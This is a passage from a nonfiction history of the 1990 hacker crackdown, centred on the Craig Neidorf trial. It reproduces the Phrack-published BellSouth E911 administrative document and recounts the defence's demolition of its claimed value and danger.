sent Kyrie to jail for 27 months, for computer and telecommunications fraud.  This was a markedly severe sentence by the usual wrist slapping standards of  hacker  busts.  Seven of Kyrie's foremost teenage disciples were also indicted and convicted.  The Kyrie  high tech street gang,  as Cook described it, had been crushed.  Cook and his colleagues had been the first ever to put someone in prison for voice mail abuse.  Their pioneering efforts had won them attention and kudos.    In his article on Kyrie, Cook drove the message home to the readers of SECURITY MANAGEMENT magazine, a trade journal for corporate security professionals.  The case, Cook said, and Kyrie's stiff sentence,  reflect a new reality for hackers and computer crime victims in the '90s....  Individuals and corporations who report computer and telecommunications crimes can now expect that their cooperation with federal law enforcement will result in meaningful punishment.  Companies and the public at large must report computer enhanced crimes if they want prosecutors and the course to protect their rights to the tangible and intangible property developed and stored on computers.     Cook had made it his business to construct this  new reality for hackers.   He'd also made it his business to police corporate property rights to the intangible.    Had the Electronic Frontier Foundation been a  hacker defense fund  as that term was generally understood, they presumably would have stood up for Kyrie.  Her 1990 sentence did indeed send a  message  that federal heat was coming down on  hackers.   But Kyrie found no defenders at EFF, or anywhere else, for that matter.  EFF was not a bail out fund for electronic crooks.    The Neidorf case paralleled the Shadowhawk case in certain ways.  The victim once again was allowed to set the value of the  stolen  property.  Once again Kluepfel was both investigator and technical advisor.  Once again no money had changed hands, but the  intent to defraud  was central.    The prosecution's case showed signs of weakness early on. The Task Force had originally hoped to prove Neidorf the center of a nationwide Legion of Doom criminal conspiracy.  The PHRACK editors threw physical get togethers every summer, which attracted hackers from across the country  generally two dozen or so of the magazine's favorite contributors and readers.   Such conventions were common in the hacker community  2600 Magazine, for instance, held public meetings of hackers in New York, every month.   LoD heavy dudes were always a strong presence at these PHRACK sponsored  Summercons.     In July 1988, an Arizona hacker named  Dictator  attended Summercon in Neidorf's home town of St. Louis.  Dictator was one of Gail Thackeray's underground informants  Dictator's underground board in Phoenix was a sting operation for the Secret Service.  Dictator brought an undercover crew of Secret Service agents to Summercon.  The agents bored spyholes through the wall of Dictator's hotel room in St Louis, and videotaped the frolicking hackers through a one way mirror.  As it happened, however, nothing illegal had occurred on videotape, other than the guzzling of beer by a couple of minors.  Summercons were social events, not sinister cabals.  The tapes showed fifteen hours of raucous laughter, pizza gobbling, in jokes and back  slapping.    Neidorf's lawyer, Sheldon Zenner, saw the Secret Service tapes before the trial.  Zenner was shocked by the complete harmlessness of this meeting, which Cook had earlier characterized as a sinister interstate conspiracy to commit fraud.  Zenner wanted to show the Summercon tapes to the jury. It took protracted maneuverings by the Task Force to keep the tapes from the jury as  irrelevant.     The E911 Document was also proving a weak reed.  It had originally been valued at  79,449.  Unlike Shadowhawk's arcane Artificial Intelligence booty, the E911 Document was not software  it was written in English.  Computer knowledgeable people found this value  for a twelve page bureaucratic document  frankly incredible.  In his  Crime and Puzzlement  manifesto for EFF, Barlow commented    We will probably never know how this figure was reached or by whom, though I like to imagine an appraisal team consisting of Franz Kafka, Joseph Heller, and Thomas Pynchon.     As it happened, Barlow was unduly pessimistic.  The EFF did, in fact, eventually discover exactly how this figure was reached, and by whom  but only in 1991, long after the Neidorf trial was over.    Kim Megahee, a Southern Bell security manager, had arrived at the document's value by simply adding up the  costs associated with the production  of the E911 Document.  Those  costs  were as follows     1.  A technical writer had been hired to research and write the E911 Document.  200 hours of work, at  35 an hour, cost    7,000.  A Project Manager had overseen the technical writer. 200 hours, at  31 an hour, made   6,200.    2.  A week of typing had cost  721 dollars.  A week of formatting had cost  721.  A week of graphics formatting had cost  742.    3.  Two days of editing cost  367.    4.  A box of order labels cost five dollars.    5.  Preparing a purchase order for the Document, including typing and the obtaining of an authorizing signature from within the BellSouth bureaucracy, cost  129.    6.  Printing cost  313.  Mailing the Document to fifty people took fifty hours by a clerk, and cost  858.    7.  Placing the Document in an index took two clerks an hour each, totalling  43.    Bureaucratic overhead alone, therefore, was alleged to have cost a whopping  17,099.  According to Mr. Megahee, the typing of a twelve page document had taken a full week.  Writing it had taken five weeks, including an overseer who apparently did nothing else but watch the author for five weeks.  Editing twelve pages had taken two days.  Printing and mailing an electronic document  which was already available on the Southern Bell Data Network to any telco employee who needed it , had cost over a thousand dollars.    But this was just the beginning.  There were also the HARDWARE EXPENSES.  Eight hundred fifty dollars for a VT220 computer monitor.  THIRTY ONE THOUSAND DOLLARS for a sophisticated VAXstation II computer.  Six thousand dollars for a computer printer.  TWENTY TWO THOUSAND DOLLARS for a copy of  Interleaf  software.  Two thousand five hundred dollars for VMS software.  All this to create the twelve page Document.    Plus ten percent of the cost of the software and the hardware, for maintenance.   Actually, the ten percent maintenance costs, though mentioned, had been left off the final  79,449 total, apparently through a merciful oversight .    Mr. Megahee's letter had been mailed directly to William Cook himself, at the office of the Chicago federal attorneys. The United States Government accepted these telco figures without question.    As incredulity mounted, the value of the E911 Document was officially revised downward.  This time, Robert Kibler of BellSouth Security estimated the value of the twelve pages as a mere  24,639.05  based, purportedly, on  R D costs.   But this specific estimate, right down to the nickel, did not move the skeptics at all  in fact it provoked open scorn and a torrent of sarcasm.    The financial issues concerning theft of proprietary information have always been peculiar.  It could be argued that BellSouth had not  lost  its E911 Document at all in the first place, and therefore had not suffered any monetary damage from this  theft.   And Sheldon Zenner did in fact argue this at Neidorf's trial  that Prophet's raid had not been  theft,  but was better understood as illicit copying.    The money, however, was not central to anyone's true purposes in this trial.  It was not Cook's strategy to convince the jury that the E911 Document was a major act of theft and should be punished for that reason alone.  His strategy was to argue that the E911 Document was DANGEROUS.  It was his intention to establish that the E911 Document was  a road map  to the Enhanced 911 System.  Neidorf had deliberately and recklessly distributed a dangerous weapon.  Neidorf and the Prophet did not care  or perhaps even gloated at the sinister idea  that the E911 Document could be used by hackers to disrupt 911 service,  a life line for every person certainly in the Southern Bell region of the United States, and indeed, in many communities throughout the United States,  in Cook's own words.  Neidorf had put people's lives in danger.    In pre trial maneuverings, Cook had established that the E911 Document was too hot to appear in the public proceedings of the Neidorf trial.  The JURY ITSELF would not be allowed to ever see this Document, lest it slip into the official court records, and thus into the hands of the general public, and, thus, somehow, to malicious hackers who might lethally abuse it.    Hiding the E911 Document from the jury may have been a clever legal maneuver, but it had a severe flaw.  There were, in point of fact, hundreds, perhaps thousands, of people, already in possession of the E911 Document, just as PHRACK had published it. Its true nature was already obvious to a wide section of the interested public  all of whom, by the way, were, at least theoretically, party to a gigantic wire fraud conspiracy .  Most everyone in the electronic community who had a modem and any interest in the Neidorf case already had a copy of the Document. It had already been available in PHRACK for over a year.    People, even quite normal people without any particular prurient interest in forbidden knowledge, did not shut their eyes in terror at the thought of beholding a  dangerous  document from a telephone company.  On the contrary, they tended to trust their own judgement and simply read the Document for themselves.  And they were not impressed.    One such person was John Nagle.  Nagle was a forty one  year old professional programmer with a masters' degree in computer science from Stanford.  He had worked for Ford Aerospace, where he had invented a computer networking technique known as the  Nagle Algorithm,  and for the prominent Californian computer graphics firm  Autodesk,  where he was a major stockholder.    Nagle was also a prominent figure on the Well, much respected for his technical knowledgeability.    Nagle had followed the civil liberties debate closely, for he was an ardent telecommunicator.  He was no particular friend of computer intruders, but he believed electronic publishing had a great deal to offer society at large, and attempts to restrain its growth, or to censor free electronic expression, strongly roused his ire.    The Neidorf case, and the E911 Document, were both being discussed in detail on the Internet, in an electronic publication called TELECOM DIGEST.  Nagle, a longtime Internet maven, was a regular reader of TELECOM DIGEST.  Nagle had never seen a copy of PHRACK, but the implications of the case disturbed him.    While in a Stanford bookstore hunting books on robotics, Nagle happened across a book called THE INTELLIGENT NETWORK. Thumbing through it at random, Nagle came across an entire chapter meticulously detailing the workings of E911 police emergency systems.  This extensive text was being sold openly, and yet in Illinois a young man was in danger of going to prison for publishing a thin six page document about 911 service.    Nagle made an ironic comment to this effect in TELECOM DIGEST.  From there, Nagle was put in touch with Mitch Kapor, and then with Neidorf's lawyers.    Sheldon Zenner was delighted to find a computer telecommunications expert willing to speak up for Neidorf, one who was not a wacky teenage  hacker.   Nagle was fluent, mature, and respectable  he'd once had a federal security clearance.    Nagle was asked to fly to Illinois to join the defense team.    Having joined the defense as an expert witness, Nagle read the entire E911 Document for himself.  He made his own judgement about its potential for menace.    The time has now come for you yourself, the reader, to have a look at the E911 Document.  This six page piece of work was the pretext for a federal prosecution that could have sent an electronic publisher to prison for thirty, or even sixty, years. It was the pretext for the search and seizure of Steve Jackson Games, a legitimate publisher of printed books.  It was also the formal pretext for the search and seizure of the Mentor's bulletin board,  Phoenix Project,  and for the raid on the home of Erik Bloodaxe.  It also had much to do with the seizure of Richard Andrews' Jolnet node and the shutdown of Charles Boykin's AT T node.  The E911 Document was the single most important piece of evidence in the Hacker Crackdown.  There can be no real and legitimate substitute for the Document itself.                              Phrack Inc.                    Volume Two, Issue 24, File 5 of 13         Control Office Administration       Of Enhanced 911 Services For       Special Services and Account Centers       by the Eavesdropper                              March, 1988   Description of Service                          The control office for Emergency 911 service is assigned in accordance with the existing standard guidelines to one of the following centers       o  Special Services Center  SSC    o  Major Accounts Center  MAC    o  Serving Test Center  STC    o  Toll Control Center  TCC     The SSC MAC designation is used in this document interchangeably for any of these four centers.  The Special Services Centers  SSCs  or Major Account Centers  MACs  have been designated as the trouble reporting contact for all E911 customer  PSAP  reported troubles.  Subscribers who have trouble on an E911 call will continue to contact local repair service  CRSAB  who will refer the trouble to the SSC MAC, when appropriate.  Due to the critical nature of E911 service, the control and timely repair of troubles is demanded.  As the primary E911 customer contact, the SSC MAC is in the unique position to monitor the status of the trouble and insure its resolution.   System Overview                   The number 911 is intended as a nationwide universal telephone number which provides the public with direct access to a Public Safety Answering Point  PSAP .  A PSAP is also referred to as an Emergency Service Bureau  ESB .  A PSAP is an agency or facility which is authorized by a municipality to receive and respond to police, fire and or ambulance services.  One or more attendants are located at the PSAP facilities to receive and handle calls of an emergency nature in accordance with the local municipal requirements.  An important advantage of E911 emergency service is improved  reduced  response times for emergency services.  Also close coordination among agencies providing various emergency services is a valuable capability provided by E911 service.  1A ESS is used as the tandem office for the E911 network to route all 911 calls to the correct  primary  PSAP designated to serve the calling station.  The E911 feature was developed primarily to provide routing to the correct PSAP for all 911 calls.  Selective routing allows a 911 call originated from a particular station located in a particular district, zone, or town, to be routed to the primary PSAP designated to serve that customer station regardless of wire center boundaries.  Thus, selective routing eliminates the problem of wire center boundaries not coinciding with district or other political boundaries.  The services available with the E911 feature include       Forced Disconnect       Default Routing   Alternative Routing     Night Service         Selective Routing       Automatic Number        Identification  ANI          Selective Transfer      Automatic Location      Identification  ALI     Preservice Installation Guidelines                                      When a contract for an E911 system has been signed, it is the responsibility of Network Marketing to establish an implementation cutover committee which should include a representative from the SSC MAC.  Duties of the E911 Implementation Team include coordination of all phases of the E911 system deployment and the formation of an on going E911 maintenance subcommittee.  Marketing is responsible for providing the following customer specific information to the SSC MAC prior to the start of call through testing     o  All PSAP's  name, address, local contact  o  All PSAP circuit ID's o  1004 911 service request including PSAP details on each PSAP  1004 Section K, L, M  o  Network configuration o  Any vendor information  name, telephone number, equipment     The SSC MAC needs to know if the equipment and sets at the PSAP are maintained by the BOCs, an independent company, or an outside vendor, or any combination. This information is then entered on the PSAP profile sheets and reviewed quarterly for changes, additions and deletions.  Marketing will secure the Major Account Number  MAN  and provide this number to Corporate Communications so that the initial issue of the service orders carry the MAN and can be tracked by the SSC MAC via CORDNET.  PSAP circuits are official services by definition.  All service orders required for the installation of the E911 system should include the MAN assigned to the city county which has purchased the system.  In accordance with the basic SSC MAC strategy for provisioning, the SSC MAC will be Overall Control Office  OCO  for all Node to PSAP circuits  official services  and any other services for this customer.  Training must be scheduled for all SSC MAC involved personnel during the pre service stage of the project.  The E911 Implementation Team will form the on going maintenance subcommittee prior to the initial implementation of the E911 system.  This sub committee will establish post implementation quality assurance procedures to ensure that the E911 system continues to provide quality service to the customer. Customer Company training, trouble reporting interfaces for the customer, telephone company and any involved independent telephone companies needs to be addressed and implemented prior to E911 cutover.  These functions can be best addressed by the formation of a sub committee of the E911 Implementation Team to set up guidelines for and to secure service commitments of interfacing organizations.  A SSC MAC supervisor should chair this subcommittee and include the following organizations     1  Switching Control Center     E911 translations     Trunking     End office and Tandem office hardware software 2  Recent Change Memory Administration Center     Daily RC update activity for TN ESN translations     Processes validity errors and rejects 3  Line and Number Administration     Verification of TN ESN translations 4  Special Service Center Major Account Center     Single point of contact for all PSAP and Node to host     troubles     Logs, tracks   statusing of all trouble reports     Trouble referral, follow up, and escalation     Customer notification of status and restoration     Analyzation of  chronic  troubles     Testing, installation and maintenance of E911 circuits 5  Installation and Maintenance  SSIM I M      Repair and maintenance of PSAP equipment and Telco     owned sets 6  Minicomputer Maintenance Operations Center     E911 circuit maintenance  where applicable  7  Area Maintenance Engineer     Technical assistance on voice  CO PSAP  network related     E911 troubles      Maintenance Guidelines                          The CCNC will test the Node circuit from the 202T at the Host site to the 202T at the Node site.  Since Host to Node  CCNC to MMOC  circuits are official company services, the CCNC will refer all Node circuit troubles to the SSC MAC. The SSC MAC is responsible for the testing and follow up to restoration of these circuit troubles.  Although Node to PSAP circuit are official services, the MMOC will refer PSAP circuit troubles to the appropriate SSC MAC.  The SSC MAC is responsible for testing and follow up to restoration of PSAP circuit troubles.  The SSC MAC will also receive reports from CRSAB IMC s  on subscriber 911 troubles when they are not line troubles.  The SSC MAC is responsible for testing and restoration of these troubles.  Maintenance responsibilities are as follows     SCC             Voice Network  ANI to PSAP                   SCC responsible for tandem switch SSIM I M        PSAP Equipment  Modems, CIU's, sets  Vendor          PSAP Equipment  when CPE  SSC MAC         PSAP to Node circuits, and tandem to PSAP voice                 circuits  EMNT  MMOC            Node site  Modems, cables, etc    Note   All above work groups are required to resolve troubles by interfacing with appropriate work groups for resolution.    The Switching Control Center  SCC  is responsible for E911 1AESS translations in tandem central offices.  These translations route E911 calls, selective transfer, default routing, speed calling, etc., for each PSAP.  The SCC is also responsible for troubleshooting on the voice network  call originating to end office tandem equipment .  For example, ANI failures in the originating offices would be a responsibility of the SCC.  Recent Change Memory Administration Center  RCMAC  performs the daily tandem translation updates  recent change  for routing of individual telephone numbers.  Recent changes are generated from service order activity  new service, address changes, etc.  and compiled into a daily file by the E911 Center  ALI DMS E911 Computer .  SSIM I M is responsible for the installation and repair of PSAP equipment. PSAP equipment includes ANI Controller, ALI Controller, data sets, cables, sets, and other peripheral equipment that is not vendor owned.  SSIM I M is responsible for establishing maintenance test kits, complete with spare parts for PSAP maintenance.  This includes test gear, data sets, and ANI ALI Controller parts.  Special Services Center  SSC  or Major Account Center  MAC  serves as the trouble reporting contact for all  PSAP  troubles reported by customer.  The SSC MAC refers troubles to proper organizations for handling and tracks status of troubles, escalating when necessary.  The SSC MAC will close out troubles with customer.  The SSC MAC will analyze all troubles and tracks  chronic  PSAP troubles.  Corporate Communications Network Center  CCNC  will test and refer troubles on all node to host circuits.  All E911 circuits are classified as official company property.  The Minicomputer Maintenance Operations Center  MMOC  maintains the E911  ALI DMS  computer hardware at the Host site.  This MMOC is also responsible for monitoring the system and reporting certain PSAP and system problems to the local MMOC's, SCC's or SSC MAC's.  The MMOC personnel also operate software programs that maintain the TN data base under the direction of the E911 Center. The maintenance of the NODE computer  the interface between the PSAP and the ALI DMS computer  is a function of the MMOC at the NODE site.  The MMOC's at the NODE sites may also be involved in the testing of NODE to Host circuits. The MMOC will also assist on Host to PSAP and data network related troubles not resolved through standard trouble clearing procedures.  Installation And Maintenance Center  IMC  is responsible for referral of E911 subscriber troubles that are not subscriber line problems.  E911 Center   Performs the role of System Administration and is responsible for overall operation of the E911 computer software. The E911 Center does A Z trouble analysis and provides statistical information on the performance of the system.  This analysis includes processing PSAP inquiries  trouble reports  and referral of network troubles.  The E911 Center also performs daily processing of tandem recent change and provides information to the RCMAC for tandem input.  The E911 Center is responsible for daily processing of the ALI DMS computer data base and provides error files, etc. to the Customer Services department for investigation and correction.  The E911 Center participates in all system implementations and on going maintenance effort and assists in the development of procedures, training and education of information to all groups.  Any group receiving a 911 trouble from the SSC MAC should close out the trouble with the SSC MAC or provide a status if the trouble has been referred to another group.  This will allow the SSC MAC to provide a status back to the customer or escalate as appropriate.  Any group receiving a trouble from the Host site  MMOC or CCNC  should close the trouble back to that group.  The MMOC should notify the appropriate SSC MAC when the Host, Node, or all Node circuits are down so that the SSC MAC can reply to customer reports that may be called in by the PSAPs.  This will eliminate duplicate reporting of troubles. On complete outages the MMOC will follow escalation procedures for a Node after two  2  hours and for a PSAP after four  4  hours. Additionally the MMOC will notify the appropriate SSC MAC when the Host, Node, or all Node circuits are down.  The PSAP will call the SSC MAC to report E911 troubles.  The person reporting the E911 trouble may not have a circuit I.D. and will therefore report the PSAP name and address.  Many PSAP troubles are not circuit specific.  In those instances where the caller cannot provide a circuit I.D., the SSC MAC will be required to determine the circuit I.D. using the PSAP profile. Under no circumstances will the SSC MAC Center refuse to take the trouble.  The E911 trouble should be handled as quickly as possible, with the SSC MAC providing as much assistance as possible while taking the trouble report from the caller.  The SSC MAC will screen test the trouble to determine the appropriate handoff organization based on the following criteria       PSAP equipment problem   SSIM I M   Circuit problem   SSC MAC   Voice network problem   SCC  report trunk group number     Problem affecting multiple PSAPs  No ALI report from all PSAPs   Contact the MMOC to check for NODE or Host computer problems before further testing.  The SSC MAC will track the status of reported troubles and escalate as appropriate.  The SSC MAC will close out customer company reports with the initiating contact.  Groups with specific maintenance responsibilities, defined above, will investigate  chronic  troubles upon request from the SSC MAC and the ongoing maintenance subcommittee.  All  out of service  E911 troubles are priority one type reports. One link down to a PSAP is considered a priority one trouble and should be handled as if the PSAP was isolated.  The PSAP will report troubles with the ANI controller, ALI controller or set equipment to the SSC MAC.  NO ANI   Where the PSAP reports NO ANI  digital display screen is blank  ask if this condition exists on all screens and on all calls.  It is important to differentiate between blank screens and screens displaying 911 00XX, or all zeroes.  When the PSAP reports all screens on all calls, ask if there is any voice contact with callers.  If there is no voice contact the trouble should be referred to the SCC immediately since 911 calls are not getting through which may require alternate routing of calls to another PSAP.  When the PSAP reports this condition on all screens but not all calls and has voice contact with callers, the report should be referred to SSIM I M for dispatch.  The SSC MAC should verify with the SCC that ANI is pulsing before dispatching SSIM.  When the PSAP reports this condition on one screen for all calls  others work fine  the trouble should be referred to SSIM I M for dispatch, because the trouble is isolated to one piece of equipment at the customer premise.  An ANI failure  i.e. all zeroes  indicates that the ANI has not been received by the PSAP from the tandem office or was lost by the PSAP ANI controller.  The PSAP may receive  02  alarms which can be caused by the ANI controller logging more than three all zero failures on the same trunk.  The PSAP has been instructed to report this condition to the SSC MAC since it could indicate an equipment trouble at the PSAP which might be affecting all subscribers calling into the PSAP.  When all zeroes are being received on all calls or  02  alarms continue, a tester should analyze the condition to determine the appropriate action to be taken.  The tester must perform cooperative testing with the SCC when there appears to be a problem on the Tandem PSAP trunks before requesting dispatch.  When an occasional all zero condition is reported, the SSC MAC should dispatch SSIM I M to routine equipment on a  chronic  troublesweep.  The PSAPs are instructed to report incidental ANI failures to the BOC on a PSAP inquiry trouble ticket  paper  that is sent to the Customer Services E911 group and forwarded to E911 center when required.  This usually involves only a particular telephone number and is not a condition that would require a report to the SSC MAC.  Multiple ANI failures which our from the same end office  XX denotes end office , indicate a hard trouble condition may exist in the end office or end office tandem trunks.  The PSAP will report this type of condition to the SSC MAC and the SSC MAC should refer the report to the SCC responsible for the tandem office.  NOTE  XX is the ESCO  Emergency Service Number  associated with the incoming 911 trunks into the tandem.  It is important that the C MAC tell the SCC what is displayed at the PSAP  i.e. 911 0011  which indicates to the SCC which end office is in trouble.  Note   It is essential that the PSAP fill out inquiry form on every ANI failure.  The PSAP will report a trouble any time an address is not received on an address display  screen blank  E911 call.   If a record is not in the 911 data base or an ANI failure is encountered, the screen will provide a display noticing such condition .  The SSC MAC should verify with the PSAP whether the NO ALI condition is on one screen or all screens.  When the condition is on one screen  other screens receive ALI information  the SSC MAC will request SSIM I M to dispatch.  If no screens are receiving ALI information, there is usually a circuit trouble between the PSAP and the Host computer.  The SSC MAC should test the trouble and refer for restoral.  Note   If the SSC MAC receives calls from multiple PSAP's, all of which are receiving NO ALI, there is a problem with the Node or Node to Host circuits or the Host computer itself.  Before referring the trouble the SSC MAC should call the MMOC to inquire if the Node or Host is in trouble.  Alarm conditions on the ANI controller digital display at the PSAP are to be reported by the PSAP's.  These alarms can indicate various trouble conditions so the SSC MAC should ask the PSAP if any portion of the E911 system is not functioning properly.  The SSC MAC should verify with the PSAP attendant that the equipment's primary function is answering E911 calls.  If it is, the SSC MAC should request a dispatch SSIM I M.  If the equipment is not primarily used for E911, then the SSC MAC should advise PSAP to contact their CPE vendor.  Note   These troubles can be quite confusing when the PSAP has vendor equipment mixed in with equipment that the BOC maintains. The Marketing representative should provide the SSC MAC information concerning any unusual or exception items where the PSAP should contact their vendor.  This information should be included in the PSAP profile sheets.  ANI or ALI controller down   When the host computer sees the PSAP equipment down and it does not come back up, the MMOC will report the trouble to the SSC MAC  the equipment is down at the PSAP, a dispatch will be required.  PSAP link  circuit  down   The MMOC will provide the SSC MAC with the circuit ID that the Host computer indicates in trouble. Although each PSAP has two circuits, when either circuit is down the condition must be treated as an emergency since failure of the second circuit will cause the PSAP to be isolated.  Any problems that the MMOC identifies from the Node location to the Host computer will be handled directly with the appropriate MMOC s  CCNC.  Note   The customer will call only when a problem is apparent to the PSAP. When only one circuit is down to the PSAP, the customer may not be aware there is a trouble, even though there is one link down, notification should appear on the PSAP screen. Troubles called into the SSC MAC from the MMOC or other company employee should not be closed out by calling the PSAP since it may result in the customer responding that they do not have a trouble.  These reports can only be closed out by receiving information that the trouble was fixed and by checking with the company employee that reported the trouble.  The MMOC personnel will be able to verify that the trouble has cleared by reviewing a printout from the host.  When the CRSAB receives a subscriber complaint  i.e., cannot dial 911  the RSA should obtain as much information as possible while the customer is on the line.  For example, what happened when the subscriber dialed 911   The report is automatically directed to the IMC for subscriber line testing.  When no line trouble is found, the IMC will refer the trouble condition to the SSC MAC.  The SSC MAC will contact Customer Services E911 Group and verify that the subscriber should be able to call 911 and obtain the ESN.  The SSC MAC will verify the ESN via 2SCCS.  When both verifications match, the SSC MAC will refer the report to the SCC responsible for the 911 tandem office for investigation and resolution.  The MAC is responsible for tracking the trouble and informing the IMC when it is resolved.  For more information, please refer to E911 Glossary of Terms.             End of Phrack File   _____________________________________      The reader is forgiven if he or she was entirely unable to read this document.  John Perry Barlow had a great deal of fun at its expense, in  Crime and Puzzlement     Bureaucrat ese of surpassing opacity.... To read the whole thing straight through without entering coma requires either a machine or a human who has too much practice thinking like one.  Anyone who can understand it fully and fluidly had altered his consciousness beyond the ability to ever again read Blake, Whitman, or Tolstoy.... the document contains little of interest to anyone who is not a student of advanced organizational sclerosis.     With the Document itself to hand, however, exactly as it was published  in its six page edited form  in PHRACK, the reader may be able to verify a few statements of fact about its nature. First, there is no software, no computer code, in the Document. It is not computer programming language like FORTRAN or C  , it is English  all the sentences have nouns and verbs and punctuation.  It does not explain how to break into the E911 system.  It does not suggest ways to destroy or damage the E911 system.    There are no access codes in the Document.  There are no computer passwords.  It does not explain how to steal long distance service.  It does not explain how to break in to telco switching stations.  There is nothing in it about using a personal computer or a modem for any purpose at all, good or bad.    Close study will reveal that this document is not about machinery.  The E911 Document is about ADMINISTRATION.  It describes how one creates and administers certain units of telco bureaucracy   Special Service Centers and Major Account Centers  SSC MAC .  It describes how these centers should distribute responsibility for the E911 service, to other units of telco bureaucracy, in a chain of command, a formal hierarchy.  It describes who answers customer complaints, who screens calls, who reports equipment failures, who answers those reports, who handles maintenance, who chairs subcommittees, who gives orders, who follows orders, WHO tells WHOM what to do.  The Document is not a  roadmap  to computers.  The Document is a roadmap to PEOPLE.    As an aid to breaking into computer systems, the Document is USELESS.  As an aid to harassing and deceiving telco people, however, the Document might prove handy  especially with its Glossary, which I have not included .  An intense and protracted study of this Document and its Glossary, combined with many other such documents, might teach one to speak like a telco employee. And telco people live by SPEECH  they live by phone communication.  If you can mimic their language over the phone, you can  social engineer  them.  If you can con telco people, you can wreak havoc among them.  You can force them to no longer trust one another  you can break the telephonic ties that bind their community  you can make them paranoid.  And people will fight harder to defend their community than they will fight to defend their individual selves.    This was the genuine, gut level threat posed by PHRACK magazine.  The real struggle was over the control of telco language, the control of telco knowledge.  It was a struggle to defend the social  membrane of differentiation  that forms the walls of the telco community's ivory tower  the special jargon that allows telco professionals to recognize one another, and to exclude charlatans, thieves, and upstarts.  And the prosecution brought out this fact.  They repeatedly made reference to the threat posed to telco professionals by hackers using  social engineering.     However, Craig Neidorf was not on trial for learning to speak like a professional telecommunications expert.  Craig Neidorf was on trial for access device fraud and transportation of stolen property.  He was on trial for stealing a document that was purportedly highly sensitive and purportedly worth tens of thousands of dollars.       John Nagle read the E911 Document.  He drew his own conclusions.  And he presented Zenner and his defense team with an overflowing box of similar material, drawn mostly from Stanford University's engineering libraries.  During the trial, the defense team  Zenner, half a dozen other attorneys, Nagle, Neidorf, and computer security expert Dorothy Denning, all pored over the E911 Document line by line.    On the afternoon of July 25, 1990, Zenner began to cross  examine a woman named Billie Williams, a service manager for Southern Bell in Atlanta.  Ms. Williams had been responsible for the E911 Document.   She was not its author  its original  author  was a Southern Bell staff manager named Richard Helms. However, Mr. Helms should not bear the entire blame  many telco staff people and maintenance personnel had amended the Document. It had not been so much  written  by a single author, as built by committee out of concrete blocks of jargon.     Ms. Williams had been called as a witness for the prosecution, and had gamely tried to explain the basic technical structure of the E911 system, aided by charts.    Now it was Zenner's turn.  He first established that the  proprietary stamp  that BellSouth had used on the E911 Document was stamped on EVERY SINGLE DOCUMENT that BellSouth wrote   THOUSANDS of documents.   We do not publish anything other than for our own company,  Ms. Williams explained.   Any company document of this nature is considered proprietary.   Nobody was in charge of singling out special high security publications for special high security protection.  They were ALL special, no matter how trivial, no matter what their subject matter  the stamp was put on as soon as any document was written, and the stamp was never removed.    Zenner now asked whether the charts she had been using to explain the mechanics of E911 system were  proprietary,  too. Were they PUBLIC INFORMATION, these charts, all about PSAPs, ALIs, nodes, local end switches   Could he take the charts out in the street and show them to anybody,  without violating some proprietary notion that BellSouth has      Ms. Williams showed some confusion, but finally agreed that the charts were, in fact, public.     But isn't this what you said was basically what appeared in PHRACK      Ms. Williams denied this.    Zenner now pointed out that the E911 Document as published in Phrack was only half the size of the original E911 Document  as Prophet had purloined it .  Half of it had been deleted  edited by Neidorf.    Ms. Williams countered that  Most of the information that is in the text file is redundant.     Zenner continued to probe.  Exactly what bits of knowledge in the Document were, in fact, unknown to the public  Locations of E911 computers   Phone numbers for telco personnel  Ongoing maintenance subcommittees   Hadn't Neidorf removed much of this     Then he pounced.   Are you familiar with Bellcore Technical Reference Document TR TSY 000350    It was, Zenner explained, officially titled  E911 Public Safety Answering Point Interface Between 1 1AESS Switch and Customer Premises Equipment.   It contained highly detailed and specific technical information about the E911 System.  It was published by Bellcore and publicly available for about  20.    He showed the witness a Bellcore catalog which listed thousands of documents from Bellcore and from all the Baby Bells, BellSouth included.  The catalog, Zenner pointed out, was free. Anyone with a credit card could call the Bellcore toll free 800 number and simply order any of these documents, which would be shipped to any customer without question.  Including, for instance,  BellSouth E911 Service Interfaces to Customer Premises Equipment at a Public Safety Answering Point.     Zenner gave the witness a copy of  BellSouth E911 Service Interfaces,  which cost, as he pointed out,  13, straight from the catalog.   Look at it carefully,  he urged Ms. Williams,  and tell me if it doesn't contain about twice as much detailed information about the E911 system of BellSouth than appeared anywhere in PHRACK.      You want me to....  Ms. Williams trailed off.   I don't understand.      Take a careful look,  Zenner persisted.   Take a look at that document, and tell me when you're done looking at it if, indeed, it doesn't contain much more detailed information about the E911 system than appeared in PHRACK.      PHRACK wasn't taken from this,  Ms. Williams said.     Excuse me   said Zenner.     PHRACK wasn't taken from this.      I can't hear you,  Zenner said.     PHRACK was not taken from this document.  I don't understand your question to me.      I guess you don't,  Zenner said.    At this point, the prosecution's case had been gutshot. Ms. Williams was distressed.  Her confusion was quite genuine. PHRACK had not been taken from any publicly available Bellcore document.  PHRACK E911 Document had been stolen from her own company's computers, from her own company's text files, that her own colleagues had written, and revised, with much labor.    But the  value  of the Document had been blown to smithereens.  It wasn't worth eighty grand.  According to Bellcore it was worth thirteen bucks.  And the looming menace that it supposedly posed had been reduced in instants to a scarecrow.  Bellcore itself was selling material far more detailed and  dangerous,  to anybody with a credit card and a phone.    Actually, Bellcore was not giving this information to just anybody.  They gave it to ANYBODY WHO ASKED, but not many did ask.  Not many people knew that Bellcore had a free catalog and an 800 number.  John Nagle knew, but certainly the average teenage phreak didn't know.   Tuc,  a friend of Neidorf's and sometime PHRACK contributor, knew, and Tuc had been very helpful to the defense, behind the scenes.  But the Legion of Doom didn't know  otherwise, they would never have wasted so much time raiding dumpsters.  Cook didn't know.  Foley didn't know. Kluepfel didn't know.  The right hand of Bellcore knew not what the left hand was doing.  The right hand was battering hackers without mercy, while the left hand was distributing Bellcore's intellectual property to anybody who was interested in telephone technical trivia  apparently, a pathetic few.    The digital underground was so amateurish and poorly organized that they had never discovered this heap of unguarded riches.  The ivory tower of the telcos was so wrapped up in the fog of its own technical obscurity that it had left all the windows open and flung open the doors.  No one had even noticed.    Zenner sank another nail in the coffin.  He produced a printed issue of TELEPHONE ENGINEER   MANAGEMENT, a prominent industry journal that comes out twice a month and costs  27 a year.  This particular issue of _TE M_, called  Update on 911,  featured a galaxy of technical details on 911 service and a glossary far more extensive than PHRACK'S.    The trial rumbled on, somehow, through its own momentum. Tim Foley testified about his interrogations of Neidorf. Neidorf's written admission that he had known the E911 Document was pilfered was officially read into the court record.    An interesting side issue came up    Terminus  had once passed Neidorf a piece of UNIX AT T software, a log in sequence, that had been cunningly altered so that it could trap passwords. The UNIX software itself was illegally copied AT T property, and the alterations  Terminus  had made to it, had transformed it into a device for facilitating computer break ins.  Terminus himself would eventually plead guilty to theft of this piece of software, 